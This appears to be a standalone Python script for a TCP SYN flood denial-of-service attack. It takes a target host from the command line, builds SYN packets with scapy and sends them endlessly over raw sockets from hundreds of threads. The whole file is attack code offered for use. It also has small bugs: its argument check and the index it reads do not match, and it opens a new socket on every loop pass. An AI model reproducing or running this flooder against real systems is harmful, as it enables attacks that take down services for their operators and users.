# Import socket and tcp packet modules
import socket
import threading
import sys
from scapy.all import IP, TCP  

# SYN flood attack function
def syn_flood(target, port, threads):

  print("Starting SYN flood on", target, "using", threads, "threads")

  # Craft SYN packet
  ip = IP(dst=target)
  tcp = TCP(sport=1234, dport=port, flags='S')
  packet = ip/tcp

  while True:
    # Send SYN packet
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.sendto(bytes(packet), (target, port))

# Input handling 

# Get target and port
target = sys.argv[1]
port = 80

# Get thread count
threads = 500  
if len(sys.argv) > 2:
  threads = int(sys.argv[3])

# Resolve target DNS name
target_ip = socket.gethostbyname(target)

# Launch SYN flood threads 
for _ in range(threads):
  thread = threading.Thread(target=syn_flood, args=(target_ip, port, threads))
  thread.start()